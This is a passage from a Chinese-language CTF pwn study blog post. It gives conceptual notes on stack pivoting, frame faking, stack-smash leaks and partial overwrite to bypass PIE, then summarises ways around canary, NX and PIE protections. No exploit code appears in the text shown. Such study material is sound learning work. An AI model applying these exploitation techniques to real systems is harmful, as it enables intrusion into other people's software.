+<h3 id="花式栈溢出"><a href="#花式栈溢出" class="headerlink" title="花式栈溢出"></a>花式栈溢出</h3><h4 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h4><p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。<br>需求原因:</p>
+<ol>
+<li>可以控制的栈溢出字节较少，需要构造长的rop</li>
+<li>开启了pie，栈地址未知，需要劫持到已知区域</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+</ol>
+<p>要求:<br>可以控制程序执行流、可以控制sp指针。</p>
+<p>可控制内容的内存一般为bss与heap</p>
+<h4 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h4><p>构造一个虚假的栈帧来控制程序的执行流。<br>构造溢出如下<br>buffer padding|fake ebp|leave ret addr|<br>构造假栈:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fake ebp</div><div class="line">|</div><div class="line">v</div><div class="line">ebp2|target function addr|leave ret addr|arg1|arg2</div></pre></td></tr></table></figure></p>
+<p>第一次程序的leave ret，会将ebp控制，之后再次执行leave ret控制esp，同时新的栈顶控制ebp</p>
+<h4 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h4><p>stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串<br>因此可以利用开启canary的程序打印些内容。</p>
+<h4 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h4><p>在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>可以暴力。</p>
+<h2 id="栈溢出利用总结"><a href="#栈溢出利用总结" class="headerlink" title="栈溢出利用总结"></a>栈溢出利用总结</h2><p>CANARY    : 栈防护，在栈中传入值返回时检测<br>需要多次泄露<br>NX        : 数据页不可执行<br>ROP<br>PIE       : 地址随机化-针对可执行文件&amp;so<br>爆破&amp;rop泄露地址</p>
+<p>后续做题进一步细分情况</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/逆向/" rel="tag"># 逆向</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/linux/" rel="tag"># linux</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/17/CMake构建跨平台项目与包管理/" rel="next" title="CMake构建跨平台项目与包管理">
+                <i class="fa fa-chevron-left"></i> CMake构建跨平台项目与包管理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/21/python速记/" rel="prev" title="python速记">
+                python速记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/1.png"
+               alt="imbaya" />
+          <p class="site-author-name" itemprop="name">imbaya</p>
+           
+              <p class="site-description motion-element" itemprop="description">..........</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">120</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">105</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本环境与工具"><span class="nav-number">1.</span> <span class="nav-text">基本环境与工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前置必知"><span class="nav-number">2.</span> <span class="nav-text">前置必知</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python2-7"><span class="nav-number">2.1.</span> <span class="nav-text">python2.7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntool"><span class="nav-number">2.2.</span> <span class="nav-text">pwntool</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LibcSearcher"><span class="nav-number">2.3.</span> <span class="nav-text">LibcSearcher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb-peda"><span class="nav-number">2.4.</span> <span class="nav-text">gdb-peda</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#概观检测"><span class="nav-number">2.4.1.</span> <span class="nav-text">概观检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#调试"><span class="nav-number">2.4.2.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看数据"><span class="nav-number">2.4.3.</span> <span class="nav-text">查看数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROPgadget"><span class="nav-number">2.5.</span> <span class="nav-text">ROPgadget</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stack溢出"><span class="nav-number">3.</span> <span class="nav-text">Stack溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#demo1-alloff"><span class="nav-number">3.1.</span> <span class="nav-text">demo1-alloff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo-canary"><span class="nav-number">3.2.</span> <span class="nav-text">demo-canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本ROP"><span class="nav-number">3.3.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#demo1-ret2text"><span class="nav-number">3.3.1.</span> <span class="nav-text">demo1-ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo2-ret2shellcode"><span class="nav-number">3.3.2.</span> <span class="nav-text">demo2-ret2shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo3-ret2syscall"><span class="nav-number">3.3.3.</span> <span class="nav-text">demo3-ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#demo4-ret2libc"><span class="nav-number">3.3.4.</span> <span class="nav-text">demo4-ret2libc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#中级ROP"><span class="nav-number">3.4.</span> <span class="nav-text">中级ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2csu"><span class="nav-number">3.4.1.</span> <span class="nav-text">ret2csu</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2reg"><span class="nav-number">3.4.2.</span> <span class="nav-text">ret2reg</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BROP"><span class="nav-number">3.4.3.</span> <span class="nav-text">BROP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级ROP"><span class="nav-number">3.5.</span> <span class="nav-text">高级ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2-dl-runtime-resolve"><span class="nav-number">3.5.1.</span> <span class="nav-text">ret2_dl_runtime_resolve</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SROP"><span class="nav-number">3.5.2.</span> <span class="nav-text">SROP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#花式栈溢出"><span class="nav-number">3.6.</span> <span class="nav-text">花式栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#stack-pivoting"><span class="nav-number">3.6.1.</span> <span class="nav-text">stack pivoting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#frame-faking"><span class="nav-number">3.6.2.</span> <span class="nav-text">frame faking</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Stack-smash"><span class="nav-number">3.6.3.</span> <span class="nav-text">Stack smash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#partial-overwrite"><span class="nav-number">3.6.4.</span> <span class="nav-text">partial overwrite</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出利用总结"><span class="nav-number">4.</span> <span class="nav-text">栈溢出利用总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">imbaya</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200,"hOffset":0,"vOffset":-50},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false});</script></body>
+</html>
